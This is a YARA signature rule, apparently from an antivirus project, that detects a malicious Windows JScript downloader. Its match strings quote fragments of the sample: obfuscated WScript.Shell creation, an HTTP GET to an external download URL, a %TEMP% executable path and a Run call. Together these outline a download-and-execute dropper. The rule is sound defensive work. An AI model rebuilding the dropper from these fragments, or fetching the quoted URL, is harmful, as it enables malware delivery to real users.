rule sig_20160401_c5b35acd9954d89bfac89dbe80f2492d {
  meta:
    description = "datamaliciousorder - file 20160401_c5b35acd9954d89bfac89dbe80f2492d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "55724654bb2405c28185d0d7932c61a0bc7905d39252a8e9986bcb0a679598f5"

  strings:
    $s1  = "var ZfHh = function IycEc() {return WScript[QvMzn](\"WScript\"+\".Shell\");}(), UkZxs = 11;" fullword ascii
    $s2  = "function WcbMhx(OeEcs, QngPhg){VaAtc = VaAtc * 1; return OeEcs - QngPhg;};" fullword ascii
    $s3  = "LanNge[JdyOg](\"G\" + \"ET\", \"http://grafikeria.pl/o9ows\", false);" fullword ascii
    $s4  = "if (LanNge[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function YwAvv() {return ZfHh[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"p9rp3kR1rf.ex\" + \"e\";};" fullword ascii
    $s6  = "function NnQl(){return OgkFw + \"\";};" fullword ascii
    $s7  = "}while (VicUsg);" fullword ascii
    $s8  = "var NcfZb = false;" fullword ascii
    $s9  = "function WllRzh()" fullword ascii
    $s10 = "return WcbMhx(NnFp, TtXa);" fullword ascii
    $s11 = "var LpPz = false;" fullword ascii
    $s12 = "function UoLlb(){return QvMzn;};" fullword ascii
    $s13 = "NcfZb = true; " fullword ascii
    $s14 = "function ZjYub(ZyDfd){ZfHh[\"R\"+\"un\"](ZyDfd, VaAtc, VaAtc);};" fullword ascii
    $s15 = "function ApqFea(){return 23;};" fullword ascii
    $s16 = "function ZqEj(KukDej) {var AjNz = (1, 2, 3, 4, 5, KukDej); return AjNz;};" fullword ascii
    $s17 = "var HjfGu = new this[\"Date\"]();" fullword ascii
    $s18 = "function DmnPxd() {return ((HxhCa == true) && (HxhCa == NcfZb)) ? 1 : VaAtc;};" fullword ascii
    $s19 = "var HxhCa = false;" fullword ascii
    $s20 = "} catch(TvbEs){};};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}